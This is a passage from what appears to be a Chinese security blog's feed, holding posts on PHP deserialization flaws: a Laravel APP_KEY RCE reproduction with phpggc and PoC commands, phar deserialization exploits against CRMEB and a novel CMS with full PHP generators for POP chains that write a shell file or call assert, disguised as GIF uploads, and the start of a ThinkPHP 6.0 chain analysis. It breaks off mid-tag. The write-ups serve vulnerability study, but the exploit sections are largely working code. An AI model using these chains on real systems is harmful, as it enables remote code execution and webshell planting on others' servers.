loading="lazy"></p><p>第140行获取头X-XSRF-TOKEN，又来到熟悉的地方了，更新decrypt方法，跟cookie造成的洞是同一个点。</p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a><strong>漏洞复现</strong></h4><p>获取APP_KEY，在根目录.env文件里</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/4/3.png" alt="" loading="lazy"></p><p>用<a href="https://github.com/ambionics/phpggc" target="_blank" rel="noopener">phpggc</a>获取laravel的反序列化的exp</p><pre><code>php phpggc Laravel/RCE1 system &quot;ipconfig&quot; -b</code></pre><p>利用kozmic的poc生成laravel rce的利用代码</p><pre><code>php cve-2018-15133.php yyEsCy8SJCpScYkcEBvrRVHv9MDV43MliNS/4ETRJaw= Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjg6ImlwY29uZmlnIjt9</code></pre><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/4/4.png" alt="" loading="lazy"></p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/4/5.png" alt="" loading="lazy"></p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><strong>参考文章</strong></h4><p>1.<a href="https://xz.aliyun.com/t/6533" target="_blank" rel="noopener">https://xz.aliyun.com/t/6533</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;laravel框架APP_KEY泄露的时候，可以通过cookie和X-XSRF-TOKEN触发反序列化漏洞，影响版本：&lt;strong&gt;5.5.x&amp;lt;=5.5.40、5.6.x&amp;lt;=5.6.29&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&quot;环境安装&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>phar反序列化漏洞挖掘</title>
    <link href="http://yoursite.com/2020/07/22/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    <id>http://yoursite.com/2020/07/22/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</id>
    <published>2020-07-21T16:00:00.000Z</published>
    <updated>2020-08-17T09:38:05.541Z</updated>
    
    <content type="html"><![CDATA[<h4 id="phar的结构"><a href="#phar的结构" class="headerlink" title="phar的结构"></a><strong>phar的结构</strong></h4><ol><li>a stub是一个文件标志，格式为 ：<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>。</li><li>manifest是被压缩的文件的属性等放在这里，这部分是以序列化存储的，是主要的攻击点。</li><li>contents是被压缩的内容。</li><li><code>signature</code> 签名，放在文件末尾。</li></ol><h4 id="受影响函数"><a href="#受影响函数" class="headerlink" title="受影响函数"></a><strong>受影响函数</strong></h4><table><thead><tr><th align="center">fileatime</th><th align="center">filectime</th><th align="center">file_exists</th><th align="center">file_get_contents</th></tr></thead><tbody><tr><td align="center">file_put_contents</td><td align="center">file</td><td align="center">filegroup</td><td align="center">fopen</td></tr><tr><td align="center">fileinode</td><td align="center">filemtime</td><td align="center">fileowner</td><td align="center">fileperms</td></tr><tr><td align="center">is_dir</td><td align="center">is_executable</td><td align="center">is_file</td><td align="center">is_link</td></tr><tr><td align="center">is_readable</td><td align="center">is_writeable</td><td align="center">parse_ini_file</td><td align="center">copy</td></tr><tr><td align="center">unlink</td><td align="center">stat</td><td align="center">is_writable</td><td align="center">readfile</td></tr></tbody></table><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a><strong>漏洞复现</strong></h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象创建调用&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>phar反序列化可以不用unserialize函数的可控，只需要满足上面的危险函数可控，大大增加了反序列化漏洞的挖掘。这里，利用以下代码生成phar文件：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token string">'phpinfo();'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"GIF89a"</span><span class="token punctuation">.</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置stub</span>    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将自定义meta-data存入manifest</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件</span>    <span class="token comment" spellcheck="true">//签名自动计算</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>phar文件是通过stub来标识的，是通过<code>xxx&lt;?php xxx.__HALT_COMPILER(); ?&gt;</code>来判断的，所以对后缀并没有要求，修改成gif，通过图片的上传点，上传到目标服务器，在利用phar://协议执行pahr文件。</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/1.png" alt="" loading="lazy"></p><p>在php.ini中需要设置phar.readonly为off，不是无法生成phar文件</p><pre><code>phar.readonly = off</code></pre><h4 id="CRMEB系统phar反序列化"><a href="#CRMEB系统phar反序列化" class="headerlink" title="CRMEB系统phar反序列化"></a><strong>CRMEB系统phar反序列化</strong></h4><p>CRMEB是基于THINKPHP6.0开发的，tp6.0的反序列化链在前面的文章分析过，利用pop链生成php文件。由于是后台反序列化也只能供学习。在crmeb\app\admin\controller\system\SystemFile.php下的openfile方法中的file参数可控。</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/2.png" alt="" loading="lazy"></p><p>第66行将file赋值给了filepath变量，然后跟进67的read_file方法</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/3.png" alt="" loading="lazy"></p><p>这里$file可控，且存在执行phar反序列化的危险函数，同时这里也可以任意文件读取</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/4.png" alt="" loading="lazy"></p><p>生成phar文件，执行tp6.0反序列化漏洞，exp如下：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">namespace</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage</span><span class="token punctuation">{</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">AbstractCache</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$autosave</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$cache</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"shell"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"&lt;?php phpinfo();?>"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage</span><span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage<span class="token punctuation">\</span>AbstractCache</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Adapter</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractCache</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$adapter</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$adapter</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string">"./public/shell.php"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">adapter</span> <span class="token operator">=</span> <span class="token variable">$adapter</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Adapter</span><span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">Local</span>     <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$writeFlags</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//对应file_put_contents的第三个参数</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span><span class="token punctuation">{</span>    <span class="token variable">$local</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Adapter<span class="token punctuation">\</span>Local</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$cache</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage<span class="token punctuation">\</span>Adapter</span><span class="token punctuation">(</span><span class="token variable">$local</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"GIF89a"</span><span class="token punctuation">.</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置stub</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$cache</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将自定义meta-data存入manifest</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件</span>    <span class="token comment" spellcheck="true">//签名自动计算</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$cache</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>将生成的phar文件修改成gif文件，找一处上传gif图片的点，上传这个pahr文件，在添加商品处：admin/store.StoreProduct/create.html</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/5.png" alt="" loading="lazy"></p><p>利用phar协议执行反序列化</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/6.png" alt="" loading="lazy"></p><h4 id="狂雨小说cms-phar反序列化"><a href="#狂雨小说cms-phar反序列化" class="headerlink" title="狂雨小说cms phar反序列化"></a><strong>狂雨小说cms phar反序列化</strong></h4><p>狂雨小说cms最新版是基于tp5.1.33开发的，此漏洞在后台触发。在控制器\application\admin\controller\Ranking.php中的delAllFiles方法，dir参数可控</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/7.png" alt="" loading="lazy"></p><p>利用tp的pop链生成phar文件，exp如下：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think</span> <span class="token punctuation">{</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Model</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$append</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$data</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"aaaa"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token string">"123456"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"aaaa"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">Request</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$param</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$hook</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$filter</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$config</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filter</span> <span class="token operator">=</span> <span class="token string">"assert"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"var_ajax"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">''</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hook</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"visible"</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span><span class="token string">"isAjax"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">param</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"phpinfo()"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Windows</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span>    <span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span><span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">;</span>    <span class="token variable">$cache</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"GIF89a"</span><span class="token punctuation">.</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置stub</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$cache</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将自定义meta-data存入manifest</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件</span>    <span class="token comment" spellcheck="true">//签名自动计算</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$cache</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>修改后缀为gif，找一处图片上传的点，将phar.gif上传</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/8.png" alt="" loading="lazy"></p><p>最后利用phar协议执行gif文件进行反序列攻击。</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/9.png" alt="" loading="lazy"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;phar的结构&quot;&gt;&lt;a href=&quot;#phar的结构&quot; class=&quot;headerlink&quot; title=&quot;phar的结构&quot;&gt;&lt;/a&gt;&lt;strong&gt;phar的结构&lt;/strong&gt;&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;a stub是一个文件标志，格式为 ：&lt;code&gt;xx
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP6.0反序列化漏洞分析</title>
    <link href="http://yoursite.com/2020/05/13/ThinkPHP6.0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/05/13/ThinkPHP6.0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-05-13T09:07:31.000Z</published>
    <updated>2020-05-13T09:11:10.699Z</updated>
    
    <content type="html"><![CDATA[<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a><strong>环境搭建</strong></h4><p>安装tp6.0</p><pre class=" language-shell"><code class="language-shell">composer create-project --prefer-dist topthink/think=6.0.x-dev tp6.0cd tp6.0php think run</code></pre><p>在index控制器中写入</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">app<span class="token punctuation">\</span>BaseController</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Index</span> <span class="token keyword">extends</span> <span class="token class-name">BaseController</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a><strong>漏洞分析</strong></h4><p>全局搜索__destruct魔术方法，在\vendor\topthink\think-orm\src\Model.php</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lazySave</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>$this-&gt;lazySave可控，为true的时候，执行save方法，跟进save方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/1.png" alt="" loading="lazy"></p><p>这里要满足两个if语句，$this-&gt;isEmpty()为false，$this-&gt;trigger要不为false，跟进isEmpty方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> bool<span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>$this-&gt;data可控，当存在的时候返回false，继续跟进trigger方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/2.png" alt="" loading="lazy"></p><p>$this-&gt;withEvent可控，当为false时，进入teturn语句，满足if语句，继续看下一行代码</p><pre class=" language-php"><code class="language-php"><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">exists</span> <span class="token operator">?</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">updateData</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">insertData</span><span class="token punctuation">(</span><span class="token variable">$sequence</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>$this-&gt;exists可控，为true时，跟进updateData方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/3.png" alt="" loading="lazy"></p><p>这里要执行到checkAllowFields方法，需要经过2个if语句，第一个if要满足$this-&gt;trigger不为false</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">false</span> <span class="token operator">===</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">trigger</span><span class="token punctuation">(</span><span class="token string">'BeforeUpdate'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>第二个if要满足$data存在，跟进下getChangedData方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/4.png" alt="" loading="lazy"></p><p>这里满足$this-&gt;force存在，$this-&gt;data也可控，即2个if语句也绕过了，就可以继续跟进checkAllowFields方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/5.png" alt="" loading="lazy"></p><p>这里发现$this-&gt;table和$this-&gt;suffix进行连接操作，即为字符串，可以触发__toString方法，这里就可以利用ThinkPHP5.2.x那条pop链来构造rce，全局进行搜索__toString方法，跟到\vendor\topthink\think-orm\src\model\concern\Conversion.php文件</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">toJson</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟进toJson-&gt;toArray方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/6.png" alt="" 